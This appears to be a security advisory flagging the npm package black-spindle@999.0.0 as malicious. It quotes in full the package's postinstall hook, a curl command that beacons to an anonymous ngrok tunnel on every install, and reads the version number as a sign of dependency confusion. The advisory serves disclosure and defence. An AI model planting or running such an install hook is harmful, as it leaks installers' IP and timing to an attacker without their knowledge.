summary: postinstall beacons installer to anonymous ngrok tunnel
details: black-spindle@999.0.0 declares a `postinstall` lifecycle hook in package.json that executes `curl http://778e-181-63-25-28.ngrok-free.app/test` on every `npm install`. The destination is a short-lived, anonymous ngrok-free.app HTTPS/HTTP tunnel unrelated to any declared publisher, contacted over plain HTTP with no pinning or verification. The shipped `index.js` is an empty stub, so the manifest's lifecycle hook is the package's entire effect: installing the package causes the installer's host to contact an attacker-controlled endpoint and discloses install-time metadata (source IP, timing, user-agent) to that endpoint. The 999.0.0 version and single-line postinstall-beacon shape are consistent with dependency-confusion / install-telemetry beaconing rather than a legitimate library.

cwes.description: The product contains code that appears to be malicious in nature.
